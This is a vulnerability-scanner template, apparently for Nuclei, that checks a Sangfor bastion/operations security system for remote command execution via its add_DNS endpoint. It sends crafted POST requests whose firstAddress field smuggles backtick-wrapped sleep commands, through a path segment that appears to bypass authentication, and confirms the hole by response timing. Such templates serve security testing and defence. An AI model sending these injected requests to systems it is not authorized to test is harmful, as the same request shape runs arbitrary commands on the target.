id: SANGFOR-add_DNS-rce

info:
  name: 深信服运维安全管理系统 add_DNS 远程命令执行漏洞
  author: SANGFOR
  severity: critical
  tags: SANGFOR

http:
  - raw:
      - |
        POST /fort/system;help/netConfig/add_DNS HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate
        Content-Type: application/x-www-form-urlencoded

        firstAddress=%60sleep%202%60&prepareAddress=8.8.8.8

      - |
        POST /fort/system;help/netConfig/add_DNS HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate
        Content-Type: application/x-www-form-urlencoded

        firstAddress=%60sleep%204%60&prepareAddress=8.8.8.8

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: dsl
        dsl:
          - 'duration_1>=2 && duration_1<4'  
          - 'duration_2>=4 && duration_2<6'
        condition: and
